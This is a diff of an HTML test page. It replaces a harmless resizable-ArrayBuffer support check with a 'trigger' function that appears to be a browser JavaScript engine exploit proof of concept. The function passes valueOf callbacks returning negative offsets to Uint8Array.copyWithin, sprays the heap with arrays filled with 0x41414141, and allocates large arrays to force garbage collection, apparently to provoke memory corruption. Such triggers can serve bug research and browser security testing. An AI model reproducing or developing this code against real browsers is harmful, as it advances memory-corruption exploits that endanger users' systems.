@@ -2,24 +2,30 @@
 <html>
 <head>
     <script>
-        function checkResizeSupport() {
-            try {
-  const buffer = new ArrayBuffer(8, { maxByteLength: 16 });
-
-  if (buffer.resizable) {
-    console.log(" Resizable ArrayBuffer is supported!");
-    buffer.resize(12);
-    console.log("New byteLength:", buffer.byteLength);
-  } else {
-    console.log(" Resizable ArrayBuffer is NOT supported (no .resizable property).");
-  }
-} catch (e) {
-  console.log(" RAB or .resize() is NOT supported:", e.message);
-}
+        async function trigger() {
+            let spray = [];
+            console.log("Starting test...");
+            for (let i = 0; i < 10; i++) {
+                try {
+                    let ab = new ArrayBuffer(0x1000);
+                    let u8 = new Uint8Array(ab);
+                    function call_back() {
+                        return -0x1000;
+                    }
+                    u8.copyWithin(0x20, {valueOf: call_back}, {valueOf: call_back});
+                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
+                } catch (e) {
+                    console.log("Error:", e);
+                }
+                let largeObject = new Array(250000).fill(0);
+                largeObject = null;
+            }
+            spray = null;
+            console.log("Test complete");
         }
     </script>
 </head>
 <body>
-    <button id="test" onclick="checkResizeSupport()">Check Resize Support</button>
+    <button id="test" onclick="trigger()">test</button>
 </body>
 </html>
